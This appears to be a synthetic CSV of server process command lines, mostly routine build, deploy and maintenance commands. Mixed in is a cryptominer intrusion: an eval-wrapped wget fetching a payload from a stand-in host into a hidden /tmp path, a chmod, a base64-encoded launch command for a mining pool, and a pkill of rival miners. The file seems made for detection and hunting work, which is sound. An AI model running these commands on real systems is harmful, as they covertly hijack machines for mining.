process_name,command_line
terraform,terraform plan -out tfplan
bash,"X='wget -q http://pkg-mirror-818.test/x -O /tmp/.X11-unix/.update'; eval ""$X"""
npm,npm test -- --runInBand
bash,ls -la /home/svc-web
aws,aws s3 ls s3://search-artifacts/
pip3,pip3 install -r requirements.txt
git,git checkout develop
node,node scripts/seed.js
find,find /home/svc-web/platform -name '*.log' -mtime +7
curl,curl -s http://localhost:8080/health
git,git checkout feature/checkout
tar,tar czf /backups/api-gateway-55.tgz /var/lib/api-gateway
python3,python3 -m pytest tests/ -q
docker,docker compose up -d api-gateway
kubectl,kubectl rollout status deploy/redis
curl,curl -fsS https://api.github.com/repos/data-pipeline/commits | head
ssh,ssh svc-web@build-20 uptime
tar,tar czf /backups/postgres-99.tgz /var/lib/postgres
bash,"X='chmod +x /tmp/.X11-unix/.update'; eval ""$X"""
grep,grep -r 'TODO' /home/svc-web/platform/src
redis-cli,redis-cli ping
git,git status
python3,python3 /opt/app/manage.py migrate
curl,curl -fsS https://api.github.com/repos/web-app/commits | head
bash,echo bm9odXAgL3RtcC8uWDExLXVuaXgvLnVwZGF0ZSAtLW1heC1jcHU9NTAgLW8gcG9vbC5taW5leG1yLnRlc3Q6NDQ0NCAtdSA0ODFhNWQxMDg5ZDY1MzFhYTg1Yzk0ODg1ZDFhMWQ4OSA+L2Rldi9udWxsIDI+JjEgJg== | base64 -d | bash
free,free -m
find,find /home/svc-web/billing-service -name '*.log' -mtime +7
git,git commit -am 'fix: redis retry logic'
psql,psql -h db -U svc-web -c 'SELECT count(*) FROM orders;'
apt-get,apt-get install -y ripgrep
systemctl,systemctl status payments
ps,ps aux --sort=-%mem | head
kubectl,kubectl logs deploy/postgres --tail 50
systemctl,systemctl status worker
docker,docker build -t api-gateway:26 .
systemctl,systemctl --user enable session-sync.service
git,git log --oneline -n 10
curl,curl -fsS https://api.github.com/repos/infra/commits | head
bash,cd /home/svc-web/mobile-api && ls
systemctl,systemctl restart postgres
npm,npm run build
npm,npm ci --no-audit
go,go build ./...
docker,docker build -t api-gateway:97 .
kubectl,kubectl rollout status deploy/nginx
git,git pull origin main
pkill,pkill -f 'xmrig|kdevtmpfsi' 2>/dev/null
kubectl,kubectl get pods -n production
systemctl,systemctl status nginx
find,find /home/svc-web/mobile-api -name '*.log' -mtime +7
journalctl,journalctl -u postgres --since '10 min ago'
htop,htop -d 5
uptime,uptime
apt-get,apt-get install -y git-lfs
docker,docker logs --tail 100 postgres
git,git pull origin hotfix/login
make,make lint
nproc,nproc --all
docker,docker build -t search:62 .
apt-get,apt-get install -y htop
scp,scp report.csv svc-web@reports:/srv/reports/
curl,curl -fsS https://api.github.com/repos/platform/commits | head
find,find /home/svc-web/data-pipeline -name '*.log' -mtime +7
aws,aws s3 ls s3://redis-artifacts/
docker,docker build -t search:87 .
ssh,ssh svc-web@build-72 uptime
docker,docker build -t auth-svc:64 .
kubectl,kubectl rollout status deploy/search
grep,grep -r 'TODO' /home/svc-web/billing-service/src
df,df -h
kubectl,kubectl rollout status deploy/api-gateway
aws,aws s3 ls s3://worker-artifacts/
systemctl,systemctl restart auth-svc
journalctl,journalctl -u payments --since '10 min ago'
